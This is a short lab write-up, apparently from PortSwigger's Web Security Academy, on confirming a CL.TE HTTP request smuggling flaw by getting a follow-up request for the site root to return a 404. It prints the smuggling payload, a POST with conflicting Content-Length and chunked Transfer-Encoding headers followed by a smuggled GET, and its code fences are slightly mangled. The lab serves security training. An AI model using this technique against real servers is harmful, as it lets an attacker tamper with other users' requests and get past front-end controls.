# Lab 04 — HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

> **Scope:** PortSwigger Web Security Academy / authorized lab environment only.

## Objective & Context

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
> **Note**
Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
> **Tip**
Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

## Walkthrough

Using Burp Repeater, issue the following request twice:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked
```

0

```http
GET /404 HTTP/1.1
X-Ignore: X
The second request should receive an HTTP 404 response.
```
